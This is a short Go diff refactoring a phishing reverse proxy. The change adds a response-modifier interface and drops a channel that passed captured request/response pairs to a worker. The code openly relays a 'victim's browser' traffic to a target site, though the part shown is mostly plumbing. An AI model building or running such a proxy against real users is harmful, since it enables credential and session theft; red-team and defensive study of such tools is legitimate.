@@ -17,6 +17,10 @@ type PhishingProxy struct {
 	responseTransformers []ResponseTransformer
 }
 
+type TransactionModifier interface {
+	HandleTransaction(r *http.Request, response []byte) []byte
+}
+
 func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error) {
 	target := request.URL
 	target.Scheme = p.targetURL.Scheme
@@ -28,7 +32,7 @@ func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error
 		return nil, err
 	}
 
-for key := range request.Header {
+	for key := range request.Header {
 		req.Header.Set(key, request.Header.Get(key))
 	}
 
@@ -48,7 +52,7 @@ for key := range request.Header {
 // Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
 func (p *PhishingProxy) HandleConnection(
 	conn net.Conn,
-	transactions chan<- HTTPTransaction,
+	modifier TransactionModifier,
 ) {
 	defer conn.Close()
 
@@ -83,14 +87,11 @@ func (p *PhishingProxy) HandleConnection(
 		return
 	}
 
+	modifiedResponse = modifier.HandleTransaction(req, modifiedResponse)
+
 	_, err = conn.Write(modifiedResponse)
 	if err != nil {
 		log.Println("Error responding to victim:", err.Error())
 		return
-	}
-
-	transactions <- HTTPTransaction{
-		Request:  *req,
-		Response: *resp,
 	}
 }
